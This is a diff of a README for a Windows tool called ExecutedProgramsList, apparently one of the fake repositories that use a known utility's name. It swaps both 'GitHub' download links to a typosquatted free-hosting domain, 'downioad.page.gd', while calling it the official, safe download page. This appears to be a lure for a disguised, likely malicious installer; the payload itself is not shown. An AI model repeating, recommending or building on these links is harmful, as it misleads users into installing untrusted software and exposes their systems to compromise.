@@ -2,7 +2,7 @@
 
 ExecutedProgramsList is a powerful Windows desktop tool designed to help you view and manage the history of executed programs on your system. With its intuitive interface and advanced features, you can easily track and analyze program execution logs on Windows 10 and 11. This tool is essential for system administrators, power users, and anyone interested in monitoring software activity on their PC.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -57,6 +57,6 @@ This documentation and tool version were last updated in **2026**. For the lates
 
 ## Download
 For the most recent version of ExecutedProgramsList, with all features and improvements, please use the following link:
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This link directs you to the official download page where you can safely obtain the installer and view additional details about the tool.
